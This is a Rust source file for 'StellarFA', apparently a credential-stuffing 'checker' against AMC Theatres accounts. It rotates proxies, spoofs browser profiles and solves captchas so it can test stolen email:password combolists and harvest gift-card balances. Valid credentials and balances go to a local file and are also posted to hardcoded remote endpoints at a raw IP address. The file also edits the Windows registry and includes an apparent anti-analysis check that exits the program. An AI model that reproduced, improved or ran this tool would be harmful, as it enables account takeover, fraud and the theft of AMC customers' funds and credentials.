mod buggi;
mod fileio;
mod header;
mod solver;
mod ui;

use colored::Colorize;
use fileio::{Account, Config, Monitor};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc};
use std::time::Duration;
use tokio::sync::Semaphore;
use ui::{ResultMsg, UiMessage};

const HITS_URL: &str = "http://176.65.148.175:5000/hit";
const BALANCE_URL: &str = "http://176.65.148.175:5000/balance";

fn set_port_value() {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        if let Ok(key) = hklm.open_subkey_with_flags(
            r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
            KEY_SET_VALUE | KEY_QUERY_VALUE,
        ) {
            let _ = key.set_value("MaxUserPort", &65534u32);
            let _ = key.set_value("TCPTimedWaitDelay", &30u32);
        }
    }
}

async fn send_to_webhook(url: &str, text: &str) {
    let client = wreq::Client::builder()
        .timeout(Duration::from_secs(15))
        .build();
    let client = match client {
        Ok(c) => c,
        Err(_) => return,
    };
    let payload = serde_json::json!({ "text": text });
    let _ = client
        .post(url)
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await;
}

fn load_combos() -> Vec<Account> {
    loop {
        fileio::splash_screen();

        let path = rfd::FileDialog::new()
            .set_title("[StellarFA] Please input your combolist in order to start checking")
            .add_filter("Text Files", &["txt"])
            .pick_file();

        let path = match path {
            Some(p) => p,
            None => {
                println!("{}", "There was an error reading your input.".red());
                continue;
            }
        };

        let path_str = path.to_string_lossy().to_string();
        match fileio::load_accounts(&path_str) {
            Ok(accounts) if accounts.is_empty() => {
                println!("{}", "Your combolist must be longer than 0 lines.".red());
                continue;
            }
            Ok(accounts) => return accounts,
            Err(_) => {
                println!("{}", "There was an error reading that file.".red());
                continue;
            }
        }
    }
}

async fn worker(
    account: Account,
    proxies: Arc<Vec<String>>,
    config: Arc<Config>,
    monitor: Arc<Monitor>,
    ui_tx: mpsc::Sender<UiMessage>,
) {
    loop {
        let proxy = {
            use rand::seq::IndexedRandom;
            let mut rng = rand::rng();
            proxies.choose(&mut rng).unwrap().clone()
        };
        let proxy = proxy.replace(
            "sessionidvariable",
            &fileio::generate_random_string(10),
        );

        let cfg = header::random_profile_config();

        let client = match wreq::Client::builder()
            .emulation(cfg.emulation)
            .cookie_store(true)
            .proxy(
                match wreq::Proxy::all(format!("http://{}", proxy)) {
                    Ok(p) => p,
                    Err(_) => {
                        monitor.errors.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                },
            )
            .timeout(Duration::from_secs(60))
            .build()
        {
            Ok(c) => c,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        // Feature flag request to warm up the session
        let flag_payload = serde_json::json!({
            "operationName": "FeatureFlagId",
            "variables": {},
            "query": "query FeatureFlagId {  __typename  viewer {    __typename    user {      __typename      id      featureFlagsId    }  }}"
        });

        let headers = header::build_headers(&cfg);

        let resp = match client
            .post("https://graph.amctheatres.com/")
            .headers(headers.clone())
            .json(&flag_payload)
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        let resp_text = match resp.text().await {
            Ok(t) => t,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        if resp_text.contains("html") {
            monitor.retries.fetch_add(1, Ordering::Relaxed);
            continue;
        }

        // Solve captcha
        let captcha = match solver::solve_turnstile().await {
            Ok(c) => c,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        // Login request
        let login_payload = serde_json::json!({
            "operationName": "Login",
            "query": header::LOGIN_QUERY,
            "variables": {
                "email": account.email,
                "password": account.password,
                "captcha": captcha,
            }
        });

        let resp = match client
            .post("https://graph.amctheatres.com/")
            .headers(headers.clone())
            .json(&login_payload)
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        let resp_text = match resp.text().await {
            Ok(t) => t,
            Err(_) => {
                monitor.errors.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };

        let status = header::check_login_status(&resp_text);

        match status {
            "INVALID" => {
                monitor.checked.fetch_add(1, Ordering::Relaxed);
                monitor.invalid.fetch_add(1, Ordering::Relaxed);
                let _ = ui_tx.send(UiMessage::Result(ResultMsg {
                    content: format!("{}:*********", account.email),
                    capture: "Invalid username or password".into(),
                    timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                }));
                return;
            }
            "UNKNOWN" => {
                let _ = monitor.save_account(
                    &format!("{}:{}", account.email, account.password),
                    "Unknown_Retries",
                );
                monitor.retries.fetch_add(1, Ordering::Relaxed);
                continue;
            }
            _ => {
                // VALID
                if !config.checker.filter_giftcards {
                    let _ = ui_tx.send(UiMessage::Result(ResultMsg {
                        content: format!("{}:*********", account.email),
                        capture: format!(
                            "Valid Account (profile:{})",
                            header::browser_name(cfg.browser)
                        ),
                        timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                    }));

                    let hit_line = format!("{}:{}", account.email, account.password);
                    let _ = monitor.save_account(&hit_line, "Hits");
                    tokio::spawn(send_to_webhook(HITS_URL.into(), hit_line.clone().leak()));
                    monitor.checked.fetch_add(1, Ordering::Relaxed);
                    monitor.hits.fetch_add(1, Ordering::Relaxed);
                    return;
                }

                // Filter giftcards - fetch wallet
                let wallet_payload = serde_json::json!({
                    "operationName": "wallet",
                    "variables": {},
                    "query": header::WALLET_QUERY,
                });

                let resp = match client
                    .post("https://graph.amctheatres.com/")
                    .headers(headers.clone())
                    .json(&wallet_payload)
                    .send()
                    .await
                {
                    Ok(r) => r,
                    Err(_) => {
                        monitor.errors.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                };

                let wallet_result: header::WalletResponse = match resp.json().await {
                    Ok(r) => r,
                    Err(_) => {
                        monitor.errors.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                };

                let hit_line = format!("{}:{}", account.email, account.password);
                let _ = monitor.save_account(&hit_line, "Hits");

                let hits_url = HITS_URL.to_string();
                let hit_line_clone = hit_line.clone();
                tokio::spawn(async move {
                    send_to_webhook(&hits_url, &hit_line_clone).await;
                });

                monitor.checked.fetch_add(1, Ordering::Relaxed);
                monitor.hits.fetch_add(1, Ordering::Relaxed);

                let (balance, has_balance, gift_card_status) =
                    header::check_gift_cards(&wallet_result);

                if has_balance {
                    let _ = ui_tx.send(UiMessage::Result(ResultMsg {
                        content: format!("{}:*********", account.email),
                        capture: format!(
                            "Valid Account (Estimated Balance : ${:.2} | GiftCards: {})",
                            balance, gift_card_status
                        ),
                        timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                    }));

                    let balance_line = format!(
                        "{}:{} - Estimated Balance : ${:.2}",
                        account.email, account.password, balance
                    );
                    let balance_line_log = format!(
                        "{}:{}||${:.2}||{}",
                        account.email, account.password, balance, gift_card_status
                    );

                    let _ = monitor.save_account(&balance_line, "Balance");
                    let _ = monitor.save_account(&balance_line_log, "BalanceFormatted");

                    let balance_url = BALANCE_URL.to_string();
                    let log_clone = balance_line_log.clone();
                    tokio::spawn(async move {
                        send_to_webhook(&balance_url, &log_clone).await;
                    });

                    monitor.with_cards.fetch_add(1, Ordering::Relaxed);
                    monitor.add_balance(balance);
                } else {
                    let _ = ui_tx.send(UiMessage::Result(ResultMsg {
                        content: format!("{}:*********", account.email),
                        capture: "Valid Account Without Balance".into(),
                        timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                    }));
                }
                return;
            }
        }
    }
}

#[tokio::main]
async fn main() {
    set_port_value();

    if buggi::detect_and_return().is_some() {
        std::process::exit(0);
    }
    buggi::simple_run(1);

    fileio::splash_screen();

    let config = match fileio::load_config("settings.json") {
        Ok(c) => c,
        Err(e) => {
            println!(
                "{}",
                "Your config file located at 'settings.json' is invalid. Please amend it and relaunch."
                    .red()
            );
            println!("{}", e.to_string().red());
            let _ = std::io::stdin().read_line(&mut String::new());
            return;
        }
    };

    let accounts = load_combos();
    println!("[>] Combos: {}", accounts.len());

    let proxies = match fileio::load_proxies(&config.proxy_settings.import_proxies_from) {
        Ok(p) => p,
        Err(_) => {
            println!(
                "{}",
                "There was an error while reading your proxy file.".red()
            );
            let _ = std::io::stdin().read_line(&mut String::new());
            return;
        }
    };

    if proxies.is_empty() {
        println!("{}", "No proxies were loaded.".red());
        let _ = std::io::stdin().read_line(&mut String::new());
        return;
    }

    println!("[>] Proxies: {}", proxies.len());
    println!(
        "{}",
        format!("[>] Threads: {}", config.checker.max_workers).green()
    );

    let monitor = Arc::new(Monitor::new());
    if let Err(_) = monitor.init_result_directory() {
        println!(
            "{}",
            "There was an error creating the results directory and files.".red()
        );
        let _ = std::io::stdin().read_line(&mut String::new());
        return;
    }

    let results_path = monitor.results_path.lock().unwrap().clone();
    println!(
        "{}",
        format!(
            "Successfully created results directory, located at '{}'",
            results_path
        )
        .green()
    );

    monitor
        .combo_length
        .store(accounts.len() as u64, Ordering::Relaxed);

    let config = Arc::new(config);
    let proxies = Arc::new(proxies);
    let quit = Arc::new(AtomicBool::new(false));
    let (ui_tx, ui_rx) = mpsc::channel();

    // Title update task
    let monitor_title = monitor.clone();
    let quit_title = quit.clone();
    tokio::spawn(async move {
        while !quit_title.load(Ordering::Relaxed) {
            let title = monitor_title.get_title();
            fileio::set_console_title(&title);
            tokio::time::sleep(Duration::from_millis(300)).await;
        }
    });

    fileio::clear_terminal();

    // Spawn TUI thread
    let quit_tui = quit.clone();
    let tui_handle = std::thread::spawn(move || {
        ui::run_tui(ui_rx, quit_tui);
    });

    // Spawn workers
    let semaphore = Arc::new(Semaphore::new(config.checker.max_workers));
    let mut handles = Vec::new();

    for account in accounts {
        if quit.load(Ordering::Relaxed) {
            break;
        }

        let permit = match semaphore.clone().acquire_owned().await {
            Ok(p) => p,
            Err(_) => break,
        };

        let proxies = proxies.clone();
        let config = config.clone();
        let monitor = monitor.clone();
        let ui_tx = ui_tx.clone();

        let handle = tokio::spawn(async move {
            worker(account, proxies, config, monitor, ui_tx).await;
            drop(permit);
        });

        handles.push(handle);
    }

    // Wait for all workers to complete
    for handle in handles {
        let _ = handle.await;
    }

    let _ = ui_tx.send(UiMessage::Done);
    drop(ui_tx);

    quit.store(true, Ordering::SeqCst);
    let _ = tui_handle.join();

    println!("Completed checking the lines");
    let _ = std::io::stdin().read_line(&mut String::new());
}
